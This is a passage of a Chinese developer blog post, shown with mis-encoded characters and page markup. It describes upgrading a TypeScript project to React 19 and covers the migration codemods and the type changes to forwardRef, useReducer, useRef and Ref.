    é©³æ˜¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:33:38.000Z" title="Mon Nov 24 2025 12:33:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif;word-break:break-word;line-height:1.75;font-weight:200;font-size:16px;overflow-x:hidden;color:#666;letter-spacing:.5px}.markdown-body a{text-decoration:none;color:#0064c8;position:relative}.markdown-body a:after{content:"";position:absolute;bottom:-2px;left:0;width:100%;height:1px;background-color:rgba(0,100,200,.7);transform:scale(0);transition:all .4s ease-in-out}.markdown-body a:link:hover:after{transform:scale(1)}.markdown-body code{padding:2px 4px;font-size:.9em;font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px;background-color:rgba(0,46,70,.0431);color:#39f}.markdown-body strong{font-weight:400}.markdown-body em{color:#ff6a00}.markdown-body del,.markdown-body s{color:#bbb}.markdown-body small{font-size:.8em;color:#bbb}.markdown-body kbd{margin:0 .1em;padding:5px 8px 3px;border:1px solid #d1d5d9;border-radius:3px;box-shadow:0 1px 0 0 #e3e4e6,inset 0 0 0 2px #fff;background-color:#eee;font-weight:600;font-size:.8em;font-family:Arial,Helvetica Neue,Helvetica,sans-serif;white-space:nowrap;color:#666}.markdown-body kbd:first-child{margin-left:0}.markdown-body kbd:last-child{margin-right:0}.markdown-body img{display:block;border:0;max-width:calc(100% - 20px);min-width:20px;min-height:20px;margin:0 10px;box-shadow:0 2px 8px 2px rgba(0,0,0,.2);transition:all .25s ease-in-out}.markdown-body img:hover{transform:translateY(-4px)}.markdown-body blockquote,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{line-height:inherit;font-size:inherit;color:inherit}.markdown-body blockquote:first-child,.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child,.markdown-body ol:first-child,.markdown-body p:first-child,.markdown-body pre:first-child,.markdown-body table:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body blockquote:last-child,.markdown-body h1:last-child,.markdown-body h2:last-child,.markdown-body h3:last-child,.markdown-body h4:last-child,.markdown-body h5:last-child,.markdown-body h6:last-child,.markdown-body ol:last-child,.markdown-body p:last-child,.markdown-body pre:last-child,.markdown-body table:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:1.6em 0 .6em;color:#333;font-weight:400;position:relative}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:-2em}.markdown-body h1{font-size:1.75em}.markdown-body h1:before{content:"#"}.markdown-body h1:first-child{margin-top:0}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.35em}.markdown-body h4{font-size:1.2em}.markdown-body h5{font-size:1.1em}.markdown-body h6{font-size:1em}.markdown-body blockquote,.markdown-body ol,.markdown-body pre,.markdown-body table,.markdown-body ul{margin:1em 0}.markdown-body p{margin:.7em 0;word-break:break-word}.markdown-body pre{padding:8px 12px;color:#666;background-color:rgba(0,46,70,.0431);border:1px solid #ebebeb;tab-size:4;white-space:pre-wrap;line-height:1.4}.markdown-body pre code{color:inherit;background-color:transparent;padding:0}.markdown-body ol,.markdown-body ul{margin:1em 0 1em 2em;padding:0;line-height:1.5!important;font-size:inherit;color:inherit}.markdown-body ol:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body ol:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body ol li,.markdown-body ul li{margin:.5em 0;list-style:inherit}.markdown-body ul{list-style:disc outside}.markdown-body ul ul{list-style-type:circle}.markdown-body ul ul ul{list-style-type:square}.markdown-body ol{list-style:decimal outside}.markdown-body ol ol{list-style-type:lower-alpha}.markdown-body ol ol ol{list-style-type:lower-roman}.markdown-body blockquote{font-size:.9em;padding:8px 20px 8px 15px;color:#666;border-left:5px solid rgba(0,100,200,.7);background-color:rgba(0,100,200,.1)}.markdown-body table{border-collapse:collapse;border-spacing:0;max-width:100%;min-width:50%;word-wrap:break-word;color:inherit}.markdown-body table thead tr{background-color:#f4f6f7}.markdown-body table td,.markdown-body table th{padding:4px 16px;font-size:.95em;text-align:left;color:inherit;border:0;min-width:72px}.markdown-body table td[align=center],.markdown-body table th[align=center]{text-align:center}.markdown-body table td[align=right],.markdown-body table th[align=right]{text-align:right}.markdown-body table th{border-bottom:2px solid #e3e4e6;color:#333;font-weight:400;white-space:nowrap}.markdown-body table td{border-bottom:1px solid #ebebeb}.markdown-body hr{margin:1.5em 0;padding:0;border:0;background:linear-gradient(90deg,rgba(0,46,70,.0431),#ebebeb 50%,rgba(0,46,70,.0431));height:1px}.markdown-body br{content:"";display:block}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18e1c0f0a29a4392a7cf9d0afe6e3785~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=%2B7IQG%2FMZSLkWzxIFK7ZpTiC6hYM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">ğŸ™ï¸ å‰è¨€</h2>
<p>React 19 å‡ºæ¥å·²ç»å¿«æœ‰ä¸€å¹´äº†ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19" target="_blank" title="https://react.dev/blog/2024/12/05/react-19" ref="nofollow noopener noreferrer">å…¬å‘Š</a> åœ¨ 24 å¹´ 12 æœˆå°±å‡ºäº†ï¼Œç„¶å³ä½¿èº«ä¸ºã€Œå‡çº§ç‹‚é­”ã€çš„æˆ‘ï¼Œä¹Ÿæ²¡æœ‰ç¬¬ä¸€æ—¶é—´è¿›è¡Œå‡çº§ã€‚åªå› ä¸ºæˆ‘æ·±çŸ¥ React çš„æ¯æ¬¡å¤§ç‰ˆæœ¬å‡çº§ï¼Œéƒ½å°†åœ¨ç¤¾åŒºæ€èµ·ä¸€é˜µè…¥é£è¡€é›¨ï¼Œä»æ„å»ºåˆ°ç»„ä»¶åº“å†åˆ°å„ç§ Linter éƒ½éœ€è¦ç´§è·Ÿå…¶è„šæ­¥ï¼Œåªå¥½ä¸€ç­‰å†ç­‰ã€‚</p>
<p>å…¶å®ä¸»è¦æ˜¯å› ä¸ºé¡¹ç›®ä¾èµ–äº† Antdï¼Œè€Œ Antd 5 å¹¶æ²¡æœ‰å®˜æ–¹å®£ç§°æ”¯æŒ React 19ï¼Œæ‰€ä»¥åªå¥½ç«­åŠ›æŒ‰è€ä½æ¸´æœ›å‡çº§çš„æ¬²ç«ã€‚æ˜¨å¤©ï¼ˆ2025/11/23ï¼‰ï¼Œè·ç¦» React 19 ç¬¬ä¸€ç‰ˆè¿‡å»äº†å°†è¿‘æ•´æ•´ä¸€å¹´ï¼ˆçœŸå¢¨è¿¹...ï¼‰ï¼Œçœ‹åˆ° Antd æ¨äº† 6.0.0ï¼Œæ—¶æœºç»ˆäºåˆ°äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/002ddc13ba074db89c37475ff15df1c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=fb%2FofaFdYRpWmuiy%2BbLN1vqw9n4%3D" alt="" loading="lazy"/></p>
<p>React 19 å‡çº§å…¬å‘Šçš„å…·ä½“å†…å®¹è¿™é‡Œå°±ä¸å•°å—¦äº†ï¼Œå·²ç»æœ‰å¥½å¤šäººèŠè¿‡ï¼Œä¸ªäººæ¯”è¾ƒå…³æ³¨çš„æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19%23ref-as-a-prop" target="_blank" title="https://react.dev/blog/2024/12/05/react-19#ref-as-a-prop" ref="nofollow noopener noreferrer"><code>forwardRef</code> ç»ˆäºå¼€å§‹è¦é€€å‡ºå†å²èˆå°</a> ğŸ‰ğŸ‰ğŸ‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19%23context-as-a-provider" target="_blank" title="https://react.dev/blog/2024/12/05/react-19#context-as-a-provider" ref="nofollow noopener noreferrer"><code>Context.Provider</code> å¯ä»¥ç›´æ¥ç”¨ <code>Context</code> ä»£æ›¿</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19%23new-feature-use" target="_blank" title="https://react.dev/blog/2024/12/05/react-19#new-feature-use" ref="nofollow noopener noreferrer">use</a>ï¼Œæ³¨æ„å®ƒä¸æ˜¯ <code>hook</code></li>
<li>Ref ç›¸å…³çš„ç±»å‹å˜æ›´</li>
</ol>
<h2 data-id="heading-1">ğŸª å¦‚ä½•å‡çº§</h2>
<p>å®˜æ–¹æä¾›äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide" ref="nofollow noopener noreferrer">å‡çº§æ–‡æ¡£</a>ï¼Œæåˆ°å‡çº§å·¥å…·ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">npx codemod@latest react/19/migration-recipe
</code></pre>
<p>ä»¥æˆ‘çš„é¡¹ç›®æ¥è®²ï¼Œå¯èƒ½ç”±äºä¸€ç›´å…³æ³¨ä¾èµ–å‡çº§ï¼Œè¿™ä¸€æ­¥å¹¶æ²¡æœ‰åŠ¨ä»»ä½•ä»£ç ã€‚</p>
<p>ä½œä¸º TS é¡¹ç›®ï¼Œè¿˜éœ€è¦ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">npx types-react-codemod@latest preset-19 ./path-to-app
</code></pre>
<p>ç„¶è€Œå®ƒä¼šç»™æ‰€æœ‰çš„ <code>ReactElement</code> æ”¹æˆ <code>ReactElement&lt;any&gt;</code>ï¼Œè¿˜å¾—å«æˆ‘æ›¿æ¢è¿˜åŸå›æ¥ã€‚</p>
<h2 data-id="heading-2">ğŸ‘» å®é™…é—®é¢˜</h2>
<p>æ¥ä¸‹æ¥ä¸»è¦æ¥è®²ä¸€ä¸‹æˆ‘åœ¨å‡çº§ä¸­é‡åˆ°çš„é—®é¢˜ï¼Œä¸»è¦æ˜¯ TS çš„ç±»å‹é—®é¢˜ã€‚</p>
<h3 data-id="heading-3">forwardRef</h3>
<p>ç»ˆäºå¯ä»¥ç”¨ <code>props.ref</code> ä»£æ›¿è‡­åæ˜­è‘—çš„ <code>forwardRef</code>ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯æœ€ä»¤äººæ¬£å–œçš„æ–°ç‰¹æ€§ã€‚è¢« <code>forwardRef</code> æŠ˜ç£¨äº†è¿™è®¸ä¹…ï¼Œç»ˆäº React è¦å¹²æ‰å®ƒäº†ã€‚</p>
<p>ä½†å¯¹äº TS ä»£ç æ¥è¯´ï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚æˆ‘ä¹‹å‰è¿™ä¹ˆå†™ï¼ˆ<code>ref</code> æ²¡æœ‰å†™æˆå¯é€‰å‚æ•°ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComp</span>(<span class="hljs-params">props: MyCompProps, ref: Ref&lt;MyCompRef&gt;</span>): <span class="hljs-title class_">ReactElement</span>;
</code></pre>
<p>å‡çº§ 19 åä¼šæŠ¥é”™ç­¾åä¸ç¬¦ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0efb7172a8c24ec189468a2ab870b0e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=mMk6ZnC1oxiRQkBbski9dvbWhDY%3D" alt="" loading="lazy"/></p>
<p>è¿™ç§æƒ…å†µï¼Œå¦‚æœæ˜¯ NPM åŒ…ï¼Œå»ºè®®å…ˆå‘ä¸ªå…¼å®¹åŒ…ï¼Œæ”¹ <code>ref</code> ä¸ºå¯é€‰å³å¯ï¼ˆç„¶åå†å‘æœ€ä½ä¾èµ–ä¸º 19 çš„å¤§ç‰ˆæœ¬åŒ…ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComp</span>(<span class="hljs-params">props: MyCompProps, ref?: Ref&lt;MyCompRef&gt;</span>): <span class="hljs-title class_">ReactElement</span>;
</code></pre>
<h3 data-id="heading-4">useReducer</h3>
<p>ä¼šå†™ TS çš„äººéƒ½çŸ¥é“ï¼ŒåŒä¸€ä¸ªæ–¹æ³•ï¼Œä½¿ç”¨æ³›å‹çš„è¯ï¼Œå¯ä»¥æœ‰å¤šç§ä¸åŒçš„å®šä¹‰æ–¹å¼ï¼Œå¥½çš„å®šä¹‰èƒ½è®©å¼€å‘è€…äº‹åŠåŠŸå€ã€‚</p>
<p><code>useReducer</code> çš„ç±»å‹å®šä¹‰å°±å˜äº†ï¼Œå…¶å®å‡çº§æ–‡æ¡£é‡Œæœ‰æåˆ°ï¼Œä½†å¿ƒæ€¥çš„å¼€å‘è€…ä¼°è®¡ä¼šçœ‹æ¼ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide%23better-usereducer-typings" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide#better-usereducer-typings" ref="nofollow noopener noreferrer">Better useReducer typings</a>ï¼Œè€Œä¸” Codemod å·¥å…·å¹¶ä¸ä¼šä¿®æ­£è¿™é‡Œçš„é—®é¢˜ã€‚</p>
<p>æ‰€ä»¥å¯¹äºç±»å‹å®šä¹‰å®Œæ•´çš„ TS é¡¹ç›®ï¼Œä¼šæœ‰å†²å‡»ï¼Œå¯¼è‡´æ„å»ºå¤±è´¥ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// React 18 çš„ `useReducer` 5 ä¸ªé‡è½½</span>
<span class="hljs-keyword">function</span> useReducer&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ReducerWithoutAction</span>&lt;<span class="hljs-built_in">any</span>&gt;, I&gt;(
    <span class="hljs-attr">reducer</span>: R,
    <span class="hljs-attr">initializerArg</span>: I,
    <span class="hljs-attr">initializer</span>: <span class="hljs-function">(<span class="hljs-params">arg: I</span>) =&gt;</span> <span class="hljs-title class_">ReducerStateWithoutAction</span>&lt;R&gt;
): [<span class="hljs-title class_">ReducerStateWithoutAction</span>&lt;R&gt;, <span class="hljs-title class_">DispatchWithoutAction</span>];

<span class="hljs-keyword">function</span> useReducer&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ReducerWithoutAction</span>&lt;<span class="hljs-built_in">any</span>&gt;&gt;(
    <span class="hljs-attr">reducer</span>: R,
    <span class="hljs-attr">initializerArg</span>: <span class="hljs-title class_">ReducerStateWithoutAction</span>&lt;R&gt;,
    initializer?: <span class="hljs-literal">undefined</span>
): [<span class="hljs-title class_">ReducerStateWithoutAction</span>&lt;R&gt;, <span class="hljs-title class_">DispatchWithoutAction</span>];

<span class="hljs-keyword">function</span> useReducer&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Reducer</span>&lt;<span class="hljs-built_in">any</span>, <span class="hljs-built_in">any</span>&gt;, I&gt;(
    <span class="hljs-attr">reducer</span>: R,
    <span class="hljs-attr">initializerArg</span>: I &amp; <span class="hljs-title class_">ReducerState</span>&lt;R&gt;,
    <span class="hljs-attr">initializer</span>: <span class="hljs-function">(<span class="hljs-params">arg: I &amp; ReducerState&lt;R&gt;</span>) =&gt;</span> <span class="hljs-title class_">ReducerState</span>&lt;R&gt;
): [<span class="hljs-title class_">ReducerState</span>&lt;R&gt;, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">ReducerAction</span>&lt;R&gt;&gt;];

<span class="hljs-keyword">function</span> useReducer&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Reducer</span>&lt;<span class="hljs-built_in">any</span>, <span class="hljs-built_in">any</span>&gt;, I&gt;(
    <span class="hljs-attr">reducer</span>: R,
    <span class="hljs-attr">initializerArg</span>: I,
    <span class="hljs-attr">initializer</span>: <span class="hljs-function">(<span class="hljs-params">arg: I</span>) =&gt;</span> <span class="hljs-title class_">ReducerState</span>&lt;R&gt;
): [<span class="hljs-title class_">ReducerState</span>&lt;R&gt;, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">ReducerAction</span>&lt;R&gt;&gt;];

<span class="hljs-keyword">function</span> useReducer&lt;R <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Reducer</span>&lt;<span class="hljs-built_in">any</span>, <span class="hljs-built_in">any</span>&gt;&gt;(
    <span class="hljs-attr">reducer</span>: R,
    <span class="hljs-attr">initialState</span>: <span class="hljs-title class_">ReducerState</span>&lt;R&gt;,
    initializer?: <span class="hljs-literal">undefined</span>
): [<span class="hljs-title class_">ReducerState</span>&lt;R&gt;, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">ReducerAction</span>&lt;R&gt;&gt;];

<span class="hljs-comment">// React 19 çš„ `useReducer` åªå‰©ä¸‹äº†ä¸¤ç§</span>
<span class="hljs-keyword">function</span> useReducer&lt;S, A <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AnyActionArg</span>&gt;(
    <span class="hljs-attr">reducer</span>: <span class="hljs-function">(<span class="hljs-params">prevState: S, ...args: A</span>) =&gt;</span> S,
    <span class="hljs-attr">initialState</span>: S
): [S, <span class="hljs-title class_">ActionDispatch</span>&lt;A&gt;];

<span class="hljs-keyword">function</span> useReducer&lt;S, I, A <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AnyActionArg</span>&gt;(
    <span class="hljs-attr">reducer</span>: <span class="hljs-function">(<span class="hljs-params">prevState: S, ...args: A</span>) =&gt;</span> S,
    <span class="hljs-attr">initialArg</span>: I,
    <span class="hljs-attr">init</span>: <span class="hljs-function">(<span class="hljs-params">i: I</span>) =&gt;</span> S
): [S, <span class="hljs-title class_">ActionDispatch</span>&lt;A&gt;];
</code></pre>
<p>ä¸»è¦åŒºåˆ«æ˜¯ï¼Œ19 æŠŠä¹‹å‰çš„ <code>R</code>ï¼ˆReducerï¼‰æ‹†æˆäº† <code>S</code>ï¼ˆStateï¼‰ å’Œ <code>A</code>ï¼ˆActionï¼‰ã€‚</p>
<p>äºæ˜¯ä¹‹å‰èƒ½è·‘é€šçš„æ„å»ºå¤±è´¥äº†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/734c6273d195443393e8f6b5d86bdd78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=n4jcFFEqEzRloCRtYzD5Bb7qqCA%3D" alt="" loading="lazy"/></p>
<p>è¿™ç§æƒ…å†µå°±å¾—è‡ªå·±æ”¹äº†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/536c678bd45a4a469975e7dd3b679a50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=Xb%2BxNGJPK%2BPJGqMokCkfBSHSrt4%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">-const [state, dispatch] = useReducer&lt;TModelReducer, null&gt;(reducer, null, createInitialState);</span>
<span class="hljs-addition">+const [state, dispatch] = useReducer&lt;IModelState, null, [TModelAction]&gt;(reducer, null, createInitialState);</span>
</code></pre>
<p>æ³¨æ„ï¼Œæ³›å‹ç¬¬ä¸‰ä¸ªå‚æ•°å¿…é¡»æ˜¯å…ƒç»„ï¼Œéœ€è¦ä¸­æ‹¬å·æ‹¬èµ·æ¥ï¼ˆä¸ªäººè®¤ä¸ºä»–ä»¬å¯ä»¥ä¼˜åŒ–æ›´å½»åº•äº›ï¼Œä¸éœ€è¦æ˜¯å…ƒç»„ï¼‰ã€‚</p>
<h3 data-id="heading-5">useRef</h3>
<p><code>useRef</code> ç±»å‹å®šä¹‰ä¹Ÿå˜äº†ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide%23useref-requires-argument" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide#useref-requires-argument" ref="nofollow noopener noreferrer">å‚æ•°å˜æˆäº†å¿…å¡«</a>ï¼Œä¹Ÿä¼šå¯¼è‡´æ„å»ºå¤±è´¥ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// React 18</span>
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T): <span class="hljs-title class_">MutableRefObject</span>&lt;T&gt;;
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T | <span class="hljs-literal">null</span>): <span class="hljs-title class_">RefObject</span>&lt;T&gt;;
<span class="hljs-keyword">function</span> useRef&lt;T = <span class="hljs-literal">undefined</span>&gt;(initialValue?: <span class="hljs-literal">undefined</span>): <span class="hljs-title class_">MutableRefObject</span>&lt;T | <span class="hljs-literal">undefined</span>&gt;;
<span class="hljs-comment">// React 19</span>
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T): <span class="hljs-title class_">RefObject</span>&lt;T&gt;;  
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T | <span class="hljs-literal">null</span>): <span class="hljs-title class_">RefObject</span>&lt;T | <span class="hljs-literal">null</span>&gt;;  
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T | <span class="hljs-literal">undefined</span>): <span class="hljs-title class_">RefObject</span>&lt;T | <span class="hljs-literal">undefined</span>&gt;;
</code></pre>
<p>è¿™æ„å‘³ç€ï¼Œéœ€è¦å°†æ‰€æœ‰çš„ç©º <code>useRef&lt;T&gt;()</code> åŠ ä¸Šé»˜è®¤å€¼ï¼Œå“ªæ€•ä¼ çš„æ˜¯ <code>undefined</code> ä¹Ÿè¦å†™ä¸€ä¸‹ã€‚</p>
<p>ä¸è¿‡æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œå°±æ˜¯ä»¥å‰å†™æˆ <code>useRef&lt;T | null&gt;(null)</code> çš„ï¼Œç°åœ¨åªéœ€è¦å†™ <code>useRef&lt;T&gt;(null)</code>ï¼Œè§ä¸‹å›¾ React 18 å’Œ 19 ä¸‹ IDE ç±»å‹æ¨å¯¼çš„åŒºåˆ«ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba6ffbde95e14ce196302fa670b4a4fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=L7Gwf09Lk2Wp8LhZnBZY%2Bqy4GIk%3D" alt="" loading="lazy"/></p>
<p>ä»¥å‰çš„ <code>RefObject&lt;T&gt;</code> å…¶å®æ˜¯ç°åœ¨çš„ <code>RefObject&lt;T | null&gt;</code>ï¼Œç°åœ¨çš„ <code>RefObject&lt;T&gt;</code> æ˜¯çœŸçš„ <code>RefObject&lt;T&gt;</code>ã€‚</p>
<h3 data-id="heading-6">Ref çš„å„ç§ç±»å‹</h3>
<p>ä¸Šé¢çš„ <code>useRef</code> ç±»å‹å®šä¹‰ï¼Œä½ å¯èƒ½å·²ç»æ³¨æ„åˆ° <code>MutableRefObject</code> çš„åœ°æ–¹éƒ½è¢«æ¢æˆäº† <code>RefObject</code>ã€‚ä»¥ä¸‹æ˜¯ä¸¤ä¸ªç‰ˆæœ¬è·Ÿ Ref æœ‰å…³çš„ç±»å‹å®šä¹‰å‰ªå½±ï¼š</p>
<p>React 18ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">RefObject</span>&lt;T&gt; {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">current</span>: T | <span class="hljs-literal">null</span>;
}
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MutableRefObject</span>&lt;T&gt; {
  <span class="hljs-attr">current</span>: T;
}
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Ref</span>&lt;T&gt; = <span class="hljs-title class_">RefCallback</span>&lt;T&gt; | <span class="hljs-title class_">RefObject</span>&lt;T&gt; | <span class="hljs-literal">null</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ForwardedRef</span>&lt;T&gt; = (<span class="hljs-function">(<span class="hljs-params">instance: T | <span class="hljs-literal">null</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>) | <span class="hljs-title class_">MutableRefObject</span>&lt;T | <span class="hljs-literal">null</span>&gt; | <span class="hljs-literal">null</span>;
</code></pre>
<p>React 19ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">RefObject</span>&lt;T&gt; {
  <span class="hljs-attr">current</span>: T; <span class="hljs-comment">// ğŸ‰ å»æ‰ readonly</span>
}
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MutableRefObject</span>&lt;T&gt; { <span class="hljs-comment">// ğŸ’¥ deprecated</span>
  <span class="hljs-attr">current</span>: T;
}
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Ref</span>&lt;T&gt; = <span class="hljs-title class_">RefCallback</span>&lt;T&gt; | <span class="hljs-title class_">RefObject</span>&lt;T | <span class="hljs-literal">null</span>&gt; | <span class="hljs-literal">null</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ForwardedRef</span>&lt;T&gt; = (<span class="hljs-function">(<span class="hljs-params">instance: T | <span class="hljs-literal">null</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>) | <span class="hljs-title class_">RefObject</span>&lt;T | <span class="hljs-literal">null</span>&gt; | <span class="hljs-literal">null</span>;
</code></pre>
<p>å˜åŒ–ï¼š</p>
<ol>
